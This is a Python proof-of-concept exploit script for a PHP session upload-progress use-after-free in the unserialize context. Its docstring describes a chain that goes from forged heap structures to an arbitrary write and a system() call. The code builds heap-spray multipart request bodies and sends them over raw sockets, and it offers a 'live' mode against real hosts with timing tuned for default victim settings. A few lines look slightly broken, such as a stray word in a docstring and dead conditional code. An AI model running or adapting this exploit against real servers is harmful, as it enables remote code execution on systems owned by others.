#!/usr/bin/env python3
"""php2shell Bug U - BG(unserialize) context orphan (CVE-2026-109618/109619 class A).

Chain:
  ARM  request 1 (same process, persistent SAPI): upload-progress multipart
       with huge attacker filenames; every update() round decodes+re-encodes
       the growing session tree pre-RINIT. When the decode's allocations pass
       memory_limit, php_var_unserialize's bailout lands in
       php_session_decode's zend_catch (session.c:283), which runs
       cancel_decode and re-bailouts WITHOUT PHP_VAR_UNSERIALIZE_DESTROY ->
       BG(unserialize) keeps level=1 and a dangling data pointer into the
       request heap. The bailout skips basic RINIT (the only clearer) and the
       SAPI that survives startup failure keeps the child alive.
  FIRE request 2: early s[] form parts (~8.2KB values, 3-page large allocs)
       reclaim the freed php_unserialize_data block with attacker bytes, then
       the file part's update() reuses it as the live context:
         - tmp_var() reads last_dtor (+16) / used_slots -> var_push_dtor
           writes copied zvals to last_dtor->data[used_slots]  (arb zval write)
         - var_access() reads entries.data[n] for R:n markers (arb zval*)
       last_dtor = MARKER -> SIGSEGV in php_var_unserialize at the marker =
       the crash receipt. With a leaked heap address instead, last_dtor aims
       the zval write at a live target; the R: route injects a reference that
       the NEXT update's zend_hash_update dtors -> zval_ptr_dtor(forged
       object) -> handlers -> zend_call_function -> system().

Lab:  python poc_unserialize.py --url http://127.0.0.1:18082/index.php --lab
Live:  python poc_unserialize.py --url https://host/index.php --sid <sid> \
           --stall 1.35 --memory-hint 8M
"""
from __future__ import annotations

import argparse
import http.client
import socket
import ssl
import struct
import sys
import time
from urllib.parse import urlparse

MARKER = 0x4141414141414141
# php_unserialize_data: last(8) first_dtor(8) last_dtor(8) allowed(8)
# ref_props(8) cur_depth(8) max_depth(8) entries{used_slots(8) next(8) data[](8*1018)}
CTX_SIZE = 8208            # -> 3 pages (12288) in Zend MM
SPRAY_LEN = CTX_SIZE - 24 - 1   # zend_string alloc = 24+len+1 -> 3 pages
ARM_NAMES = 20             # default max_file_uploads
ARM_NAMELEN = 262144       # default; --arm-namelen can override
ARM_NAMELEN_DEFAULT = ARM_NAMELEN


def forge_ctx(last: int, first: int, used: int, data0: int) -> bytes:
    """Bytes for the reclaimed php_unserialize_data (string val = block+24)."""
    rec = bytearray(SPRAY_LEN)
    def put(off_in_block: int, raw: bytes):
        i = off_in_block - 24
        if 0 <= i and i + len(raw) <= len(rec):
            rec[i:i + len(raw)] = raw
    put(0, struct.pack("<Q", last))          # entries-chain last (var_push)
    put(8, struct.pack("<Q", first))         # first_dtor (var_destroy)
    put(16, struct.pack("<Q", last))         # last_dtor (tmp_var arb write)
    put(56, struct.pack("<Q", used))         # entries.used_slots
    put(64, struct.pack("<Q", 0))            # entries.next
    put(72, struct.pack("<Q", data0))        # entries.data[0]
    put(80, struct.pack("<Q", data0))        # entries.data[1]
    return bytes(rec)


def mp_part(boundary: bytes, name: bytes, value: bytes, filename: bytes | None = None) -> bytes:
    disp = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        disp += b'; filename="' + filename + b'"'
    return b"--" + boundary + b"\r\n" + disp + b"\r\n\r\n" + value + b"\r\n"


def arm_body(sid: str, boundary: bytes, nfiles: int = ARM_NAMES, namelen: int = ARM_NAMELEN_DEFAULT) -> bytes:
    out = bytearray()
    out += mp_part(boundary, b"PHPSESSID", sid.encode())
    out += mp_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for i in range(nfiles):
        fn = (f"f{i}-".encode() + b"N" * namelen)[:namelen]
        out += mp_part(boundary, f"upload{i}".encode(), b"Z", filename=fn)
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def fire1_body(sid: str, boundary: bytes, filler: int = 4300000) -> bytes:
    """Phase 2: pressure request. php -S buffers the whole body first, so a
    ~4.3MB filler part IS the memory pressure (no $_POST copy of it happens -
    the file part below is parsed first). Its update decodes the arm's ~1MB
    session file with <1MB left -> OOM lands mid-decode (the big name-string
    alloc) -> php_session_decode's zend_catch orphans BG(unserialize) and
    cancel_decode unlinks the session (also dissolving the leaked flock)."""
    out = bytearray()
    out += mp_part(boundary, b"PHPSESSID", sid.encode())
    out += mp_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    # filler fields FIRST: memory is full when the file part triggers the
    # session decode (file last = decode happens under pressure)
    out += mp_part(boundary, b"filler", b"P" * filler)
    out += mp_part(boundary, b"f", b"A" * 64, filename=b"a")
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def zval_spray(mark: int) -> bytes:
    """8.2KB string whose body is a repeating fake-zval pattern:
    value(8)=mark, type_info(4)=IS_REFERENCE(8), pad(4). Any 16-byte-aligned
    read of a reclaimed block yields an IS_REFERENCE zval -> the fire's
    rinit-flush encode of the dangling $_SESSION walks it into
    php_add_var_hash -> fake-HashTable walk -> arData (= reclaiming string's
    len field) -> wild deref -> SIGSEGV."""
    zval = struct.pack("<QII", mark, 8, 0)
    return (zval * (SPRAY_LEN // 16))[:SPRAY_LEN]


def fire_body(sid: str, boundary: bytes, n_spray: int, ctx: bytes, n_small: int = 600,
              t_small: bytes | None = None) -> bytes:
    out = bytearray()
    out += mp_part(boundary, b"PHPSESSID", sid.encode())
    out += mp_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(n_spray):
        out += mp_part(boundary, b"s[]", ctx)
    # small-bin saturation: 23-byte values land in the 48-byte bin where the
    # dangling zend_reference (and its inner zval) lives. Pattern = marker
    # value + IS_REFERENCE type_info at every 16-byte alignment. t_small lets
    # the CALL stage swap in the 288-byte forged object block instead.
    # Measured layout of the 64-byte serialize context (it is a zend_array):
    # +0 gc, +8 u.flags, +12 nTableMask, +16 arData, +24 nNumUsed,
    # +28 nNumOfElements, +32 nTableSize, +40 nInternalPointer,
    # +48 nNextFreeElement, +56 pDestructor (= zval_ptr_dtor). Value bytes
    # start at +24, so val[24] is nNextFreeElement and val[32] pDestructor.
    small = t_small if t_small is not None else (struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8)
    for _ in range(n_small):
        out += mp_part(boundary, b"t[]", small)
    out += mp_part(boundary, b"f", b"A" * 6144, filename=b"a")
    out += mp_part(boundary, b"g", b"B" * 6144, filename=b"b")
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def send(url: str, body: bytes, boundary: bytes, sid: str, stall: float,
         chunk: int) -> tuple[int | None, bytes, float]:
    u = urlparse(url)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    head = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    t0 = time.time()
    if u.scheme == "https":
        raw = socket.create_connection((host, port), timeout=90)
        ss = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
    else:
        ss = socket.create_connection((host, port), timeout=90)
    try:
        cut = len(head) + (chunk if chunk else len(body))
        ss.sendall(head + body[:chunk if chunk else len(body)])
        if chunk and stall:
            time.sleep(stall)
            ss.sendall(body[chunk:])
        ss.settimeout(60)
        data = bytearray()
        while True:
            try:
                d = ss.recv(65536)
            except (socket.timeout, ConnectionResetError, ssl.SSLError) as e:
                data.extend(f"\n<RECV {type(e).__name__}>".encode())
                break
            if not d:
                break
            data += d
    finally:
        try:
            ss.close()
        except OSError:
            pass
    dt = time.time() - t0
    raw_b = bytes(data)
    if b"HTTP/" in raw_b.split(b"\r\n", 1)[0]:
        status = int(raw_b.split(b" ", 2)[1])
    else:
        status = None
    hdr_end = raw_b.find(b"\r\n\r\n")
    return status, (raw_b[hdr_end + 4:] if hdr_end > 0 else raw_b), dt


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("--sid", default="u0123456789abcdefghijklmnopqrstuv")  # 32 chars, valid charset
    p.add_argument("--fire-sid", default="uu123456789abcdefghijklmnopqrstu",
                   help="fresh sid for the fire request (arm's bailout leaks a flock'd sess fd)")
    p.add_argument("--stall", type=float, default=1.35, help="mid-body pause for default min_freq=1 victims")
    p.add_argument("--spray", type=int, default=80)
    p.add_argument("--chunk", type=int, default=0, help="bytes before the stall (0 = send whole)")
    p.add_argument("--last", default="0x4141414141414141", help="forged last_dtor pointer (marker or leaked target)")
    p.add_argument("--data0", default="0x4242424242424242", help="forged entries.data[0] for R: markers")
    p.add_argument("--lab", action="store_true", help="no stalls; lab min_freq=0")
    p.add_argument("--arm-files", type=int, default=ARM_NAMES)
    p.add_argument("--arm-namelen", type=int, default=ARM_NAMELEN_DEFAULT)
    p.add_argument("--p1-spray", type=int, default=390,
                   help="phase-2 filler size in ~11KB units (raw body pressure)")
    p.add_argument("--skip-arm", action="store_true")
    p.add_argument("--skip-p1", action="store_true")
    p.add_argument("--skip-fire", action="store_true")
    a = p.parse_args()

    last = int(a.last, 0)
    data0 = int(a.data0, 0)
    ctx = forge_ctx(last, last, used=1018, data0=data0)

    bnd = b"UctxPoc2026"
    arm = arm_body(a.sid, bnd, a.arm_files, a.arm_namelen)
    p1 = fire1_body(a.sid, bnd, a.p1_spray * 11000 if a.p1_spray else 4300000)
    zspray = zval_spray(last)
    fire = fire_body(a.fire_sid, bnd, a.spray, zspray)

    if not a.skip_arm:
        print(f"[arm ] names={a.arm_files}x{a.arm_namelen} body={len(arm)}")
        st, body, dt = send(a.url, arm, bnd, a.sid, 0.0 if a.lab else a.stall,
                            0 if a.lab else min(a.chunk or 8192, len(arm)))
        print(f"[arm ] status={st} dt={dt:.2f}s fatal={b'exhausted' in body} alive-check-next")
        print(f"[arm ] body[:160]={body[:160]!r}")

    if not a.skip_p1:
        print(f"[p1  ] pressure spray={a.p1_spray} body={len(p1)}")
        st, body, dt = send(a.url, p1, bnd, a.sid, 0.0, 0)
        print(f"[p1  ] status={st} dt={dt:.2f}s fatal={b'exhausted' in body}")
        print(f"[p1  ] body[:160]={body[:160]!r}")
    if a.skip_fire:
        return

    print(f"[fire] spray={a.spray}x{len(ctx)} last_dtor={hex(last)} body={len(fire)}")
    st, body, dt = send(a.url, fire, bnd, a.sid, 0.0 if a.lab else a.stall,
                        0 if a.lab else min(a.chunk or 8192, len(fire)))
    print(f"[fire] status={st} dt={dt:.2f}s")
    hit = struct.pack("<Q", last) in fire and b"4141414141" in body.hex().encode() if False else None
    for needle in (b"4141414141414141", b"4242424242424242", b"LABOK", b"PID="):
        if needle in body or needle in body.hex().encode():
            print(f"[fire] HIT {needle!r}")
    print(f"[fire] body[:400]={body[:400]!r}")


if __name__ == "__main__":
    main()


def arm_mixed(sid: str, boundary: bytes, big: int = 20, big_len: int = 65536,
              small: int = 900) -> bytes:
    """Arm whose session tree inflates on decode: `big` long filenames push
    memory to the ceiling during the parse, `small` one-byte-named files cost
    almost nothing on disk but allocate a hash bucket + zvals per entry when
    the END-cleanup decode runs - so the decode, not the file read, is the
    allocation that crosses memory_limit (and php_var_unserialize_destroy is Salt
    skipped, leaving BG(unserialize).level = 1)."""
    out = bytearray()
    out += mp_part(boundary, b"PHPSESSID", sid.encode())
    out += mp_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for i in range(big):
        out += mp_part(boundary, b"f[]", b"A", filename=b"B" * (big_len - 4) + b"%04d" % i)
    for i in range(small):
        out += mp_part(boundary, b"g[]", b"A", filename=b"s%05d" % i)
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def arm_many(sid: str, boundary: bytes, n: int, namelen: int = 6) -> bytes:
    """Arm with `n` tiny-named file parts, 1-byte values.

    The END-cleanup decode rebuilds the whole progress tree, so the decode peak
    is ~2x the live tree while the session buffer it reads is tiny (short
    names + 1-byte values). That makes the *decode* the allocation that
    crosses memory_limit - the case the END-cleanup arm cannot reach. Needs
    max_file_uploads and max_multipart_body_parts raised.
    """
    out = bytearray()
    out += mp_part(boundary, b"PHPSESSID", sid.encode())
    out += mp_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for i in range(n):
        name = (b"s%0*d" % (namelen - 1, i))[:namelen]
        out += mp_part(boundary, b"g[]", b"A", filename=name)
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)
